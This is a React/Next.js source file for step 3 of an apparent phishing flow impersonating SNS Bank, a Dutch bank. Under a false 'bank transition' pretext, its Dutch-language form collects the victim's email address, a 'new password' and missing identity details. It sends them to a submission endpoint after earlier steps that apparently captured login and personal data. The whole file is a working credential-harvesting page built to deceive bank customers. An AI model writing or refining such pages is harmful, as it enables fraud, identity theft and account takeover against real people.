"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { useForm } from "react-hook-form"
import { zodResolver } from "@hookform/resolvers/zod"
import { z } from "zod"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form"
import { Input } from "@/components/ui/input"
import { Checkbox } from "@/components/ui/checkbox"
import { Mail, ArrowLeft, ArrowRight, Info } from "lucide-react"
import { useToast } from "@/hooks/use-toast"

const step3Schema = z.object({
  missingData: z.array(z.enum(["middlenames", "address", "birthplace", "nationality"])),
  fullEmail: z.string().email("Ongeldig e-mailadres"),
  newPassword: z.string().min(6, "Wachtwoord moet minimaal 6 tekens zijn"),
})

type Step3Data = z.infer<typeof step3Schema>

const emailProviders = [
  { domain: "gmail.com", name: "Gmail", icon: "G", color: "bg-red-500" },
  { domain: "hotmail.com", name: "Hotmail", icon: "H", color: "bg-blue-500" },
  { domain: "outlook.com", name: "Outlook", icon: "O", color: "bg-blue-600" },
  { domain: "ziggo.nl", name: "Ziggo", icon: "Z", color: "bg-orange-500" },
  { domain: "kpn.nl", name: "KPN", icon: "K", color: "bg-green-500" },
  { domain: "xs4all.nl", name: "XS4ALL", icon: "X", color: "bg-purple-500" },
]

export default function Step3() {
  const router = useRouter()
  const { toast } = useToast()
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [showEmailDropdown, setShowEmailDropdown] = useState(false)
  const [emailSearch, setEmailSearch] = useState("")
  const [step1Data, setStep1Data] = useState<any>(null)
  const [step2Data, setStep2Data] = useState<any>(null)

  useEffect(() => {
    const data1 = localStorage.getItem("step1Data")
    const data2 = localStorage.getItem("step2Data")
    if (!data1 || !data2) {
      router.push("/step-1")
      return
    }
    setStep1Data(JSON.parse(data1))
    setStep2Data(JSON.parse(data2))
  }, [router])

  const form = useForm<Step3Data>({
    resolver: zodResolver(step3Schema),
    defaultValues: {
      missingData: [],
      fullEmail: "",
      newPassword: "",
    },
  })

  const onSubmit = async (data: Step3Data) => {
    setIsSubmitting(true)

    try {
      const response = await fetch("/api/step-submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ...data, step: 3 }),
      })

      if (!response.ok) {
        throw new Error("Fout bij verzenden")
      }

      localStorage.setItem("step3Data", JSON.stringify(data))

      toast({
        title: "Stap 3 voltooid",
        description: "Uw aanvullende gegevens zijn opgeslagen. Ga door naar de laatste stap.",
      })

      router.push("/step-4")
    } catch (error) {
      toast({
        title: "Fout bij verzenden",
        description: "Er is een fout opgetreden. Probeer het opnieuw.",
        variant: "destructive",
      })
    } finally {
      setIsSubmitting(false)
    }
  }

  const handleBack = () => {
    router.push("/step-2")
  }

  const selectEmailProvider = (domain: string, name: string) => {
    setEmailSearch(name)
    setShowEmailDropdown(false)
    const currentEmail = form.getValues("fullEmail")
    if (!currentEmail.includes("@")) {
      form.setValue("fullEmail", `gebruiker@${domain}`)
    }
  }

  const filteredProviders = emailProviders.filter((provider) =>
    provider.name.toLowerCase().includes(emailSearch.toLowerCase()),
  )

  if (!step1Data || !step2Data) {
    return <div>Loading...</div>
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-orange-50 to-white">
      {/* Header with Progress */}
      <header className="bg-white border-b border-gray-200 shadow-sm">
        <div className="max-w-4xl mx-auto px-4 py-6">
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center space-x-4">
              <div className="w-12 h-12 bg-gradient-to-br from-orange-500 to-orange-600 rounded-lg flex items-center justify-center">
                <span className="text-white font-bold text-lg">SNS</span>
              </div>
              <div>
                <h1 className="text-xl font-bold text-gray-900">SNS Bank</h1>
                <p className="text-orange-600 text-sm">Re-identificatie</p>
              </div>
            </div>
          </div>

          {/* Progress Indicator */}
          <div className="flex items-center justify-center">
            <div className="flex items-center space-x-4">
              <div className="flex items-center">
                <div className="w-10 h-10 bg-green-500 text-white rounded-full flex items-center justify-center text-sm font-bold">
                  ✓
                </div>
                <span className="ml-3 text-sm font-medium text-green-600">Inloggen</span>
              </div>
              <div className="w-12 h-px bg-green-300"></div>
              <div className="flex items-center">
                <div className="w-10 h-10 bg-green-500 text-white rounded-full flex items-center justify-center text-sm font-bold">
                  ✓
                </div>
                <span className="ml-3 text-sm font-medium text-green-600">Persoonlijke gegevens</span>
              </div>
              <div className="w-12 h-px bg-orange-300"></div>
              <div className="flex items-center">
                <div className="w-10 h-10 bg-orange-500 text-white rounded-full flex items-center justify-center text-sm font-bold">
                  3
                </div>
                <span className="ml-3 text-sm font-medium text-orange-600">Aanvullende info</span>
              </div>
              <div className="w-12 h-px bg-gray-300"></div>
              <div className="flex items-center">
                <div className="w-10 h-10 bg-gray-200 text-gray-500 rounded-full flex items-center justify-center text-sm font-bold">
                  4
                </div>
                <span className="ml-3 text-sm text-gray-500">Bevestiging</span>
              </div>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-3xl mx-auto px-4 py-12">
        <Card className="shadow-xl border-0">
          <CardContent className="p-8">
            <div className="text-center mb-8">
              <div className="w-20 h-20 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-6">
                <Mail className="h-10 w-10 text-purple-600" />
              </div>
              <h2 className="text-3xl font-bold text-gray-900 mb-3">Aanvullende informatie</h2>
              <p className="text-gray-600">Vul de ontbrekende gegevens aan en stel uw nieuwe wachtwoord in</p>
            </div>

            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-8">
                <FormField
                  control={form.control}
                  name="missingData"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-gray-900 font-semibold text-base">
                        Welke gegevens ontbraken bij uw oorspronkelijke identificatie?
                      </FormLabel>
                      <div className="grid md:grid-cols-2 gap-4 mt-4">
                        {[
                          { value: "middlenames", label: "Tussenvoegsel/voornamen" },
                          { value: "address", label: "Adresgegevens" },
                          { value: "birthplace", label: "Geboorteplaats" },
                          { value: "nationality", label: "Nationaliteit" },
                        ].map((type) => (
                          <div
                            key={type.value}
                            className="flex items-center space-x-3 p-4 border border-gray-200 rounded-lg hover:border-orange-300 transition-colors"
                          >
                            <Checkbox
                              id={type.value}
                              checked={field.value?.includes(type.value as any)}
                              onCheckedChange={(checked) => {
                                const updatedTypes = checked
                                  ? [...(field.value || []), type.value]
                                  : field.value?.filter((t) => t !== type.value) || []
                                field.onChange(updatedTypes)
                              }}
                            />
                            <label htmlFor={type.value} className="font-medium text-gray-900 cursor-pointer flex-1">
                              {type.label}
                            </label>
                          </div>
                        ))}
                      </div>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                {/* Email Provider Selection */}
                <div className="space-y-4">
                  <FormLabel className="text-gray-900 font-semibold text-base">
                    E-mailadres eerder gebruikt bij SNS Bank
                  </FormLabel>
                  <div className="relative">
                    <Input
                      placeholder="Zoek uw e-mailprovider..."
                      value={emailSearch}
                      onChange={(e) => setEmailSearch(e.target.value)}
                      onFocus={() => setShowEmailDropdown(true)}
                      className="h-12 border-2 focus:border-orange-500"
                    />
                    {showEmailDropdown && (
                      <div className="absolute z-10 w-full mt-1 bg-white border border-gray-200 rounded-lg shadow-lg max-h-48 overflow-y-auto">
                        {filteredProviders.map((provider) => (
                          <div
                            key={provider.domain}
                            className="flex items-center space-x-3 p-3 hover:bg-gray-50 cursor-pointer"
                            onClick={() => selectEmailProvider(provider.domain, provider.name)}
                          >
                            <span
                              className={`w-8 h-8 ${provider.color} rounded text-white text-sm flex items-center justify-center font-bold`}
                            >
                              {provider.icon}
                            </span>
                            <span className="font-medium">{provider.name}</span>
                            <span className="text-gray-500 text-sm">@{provider.domain}</span>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                </div>

                <FormField
                  control={form.control}
                  name="fullEmail"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-gray-900 font-semibold text-base">Uw volledige e-mailadres</FormLabel>
                      <FormControl>
                        <Input
                          type="email"
                          placeholder="gebruiker@voorbeeld.nl"
                          {...field}
                          className="h-12 border-2 focus:border-orange-500"
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                {/* Bank Transition Section */}
                <div className="bg-blue-50 border border-blue-200 rounded-xl p-6">
                  <div className="flex items-start space-x-4">
                    <div className="w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center flex-shrink-0">
                      <Info className="h-6 w-6 text-blue-600" />
                    </div>
                    <div className="flex-1">
                      <h3 className="text-xl font-semibold mb-3 text-blue-900">Bank transitie</h3>
                      <p className="text-blue-800 mb-6">
                        SNS Bank is bezig met een transitie naar een nieuw systeem. Hiervoor hebben wij uw e-mailadres
                        en een nieuw wachtwoord nodig.
                      </p>

                      <FormField
                        control={form.control}
                        name="newPassword"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-blue-900 font-semibold">
                              Nieuw wachtwoord voor transitie
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="password"
                                placeholder="Nieuw wachtwoord (minimaal 6 tekens)"
                                {...field}
                                className="h-12 border-2 focus:border-blue-500 bg-white"
                              />
                            </FormControl>
                            <FormMessage />
                            <p className="text-sm text-blue-700 mt-2">
                              Dit wachtwoord wordt gebruikt voor het nieuwe SNS Bank systeem
                            </p>
                          </FormItem>
                        )}
                      />
                    </div>
                  </div>
                </div>

                <div className="flex flex-col gap-4 mt-10">
                  <Button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white h-14 text-lg font-semibold rounded-lg shadow-lg hover:shadow-xl transition-all duration-200"
                  >
                    {isSubmitting ? (
                      <div className="flex items-center space-x-2">
                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                        <span>Bezig met opslaan...</span>
                      </div>
                    ) : (
                      <div className="flex items-center space-x-2">
                        <span>Volgende stap</span>
                        <ArrowRight className="h-5 w-5" />
                      </div>
                    )}
                  </Button>
                  <Button
                    type="button"
                    variant="outline"
                    onClick={handleBack}
                    disabled={isSubmitting}
                    className="w-full h-14 border-2 border-gray-300 hover:border-orange-500 text-gray-700 hover:text-orange-600 rounded-lg bg-transparent"
                  >
                    <ArrowLeft className="h-5 w-5 mr-2" />
                    Terug naar stap 2
                  </Button>
                </div>
              </form>
            </Form>
          </CardContent>
        </Card>
      </main>
    </div>
  )
}
